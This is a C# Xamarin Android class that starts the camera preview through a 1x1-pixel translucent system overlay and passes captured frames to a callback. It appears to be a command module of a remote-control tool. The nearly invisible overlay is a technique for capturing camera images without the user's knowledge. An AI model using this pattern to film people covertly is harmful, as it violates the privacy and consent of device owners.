using System;

using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Hardware;
using Android.Content;
using DTRC.Droid.Services.Commands;
using DTRC.Services.Commands;
using DTRC.Droid.Services.Commands.CameraStreaming;

namespace DTRC.Droid.Services.Commands.CameraStreaming {
    public class CameraStreaming {

        public CameraStreaming(string pictureDefaultFilename) {
            this.PictureDefaultFilename = pictureDefaultFilename;
        }

        private string PictureDefaultFilename;

        private Camera camera;
        private SurfaceView surfaceView;
        private ISurfaceHolder surfaceHolder;
        private MySurfaceHolderCallback surfaceHolderCallback;
        private MyCameraPreviewCallback cameraPreviewCallback;

        public bool Start(MyCameraPreviewCallback.GotchaAFrame gotchaAFrameFromCamera) {
            bool result = true;
            try {
                using (Handler handler = new Handler(Looper.MainLooper)) {
                    handler.Post(() => {
                        cameraPreviewCallback = new MyCameraPreviewCallback(PictureDefaultFilename,
                            gotchaAFrameFromCamera);

                        surfaceView = new SurfaceView(Application.Context);

                        IWindowManager windowManager =
                            Application.Context.GetSystemService(Context.WindowService).JavaCast<IWindowManager>();
                        WindowManagerLayoutParams parameters = new WindowManagerLayoutParams(
                                1, 1,
                                WindowManagerTypes.SystemOverlay,
                                WindowManagerFlags.WatchOutsideTouch,
                                Android.Graphics.Format.Translucent);

                        surfaceHolder = surfaceView.Holder;

                        surfaceView.SetZOrderOnTop(true);
                        surfaceHolder.SetFormat(Android.Graphics.Format.Translucent);

                        surfaceHolderCallback = new MySurfaceHolderCallback(camera, surfaceHolder, cameraPreviewCallback);
                        surfaceHolder.AddCallback(surfaceHolderCallback);

                        windowManager.AddView(surfaceView, parameters);
                    });
                }

            }
            catch (Exception e) {
                result = false;
            }

            return result;
        }


        public bool Stop() {
            bool result = true;
            try {
                camera.StopPreview();
                surfaceHolder.Dispose();
            } catch(Exception e) {
                result = false;
            }
            return result;
        }


    }
}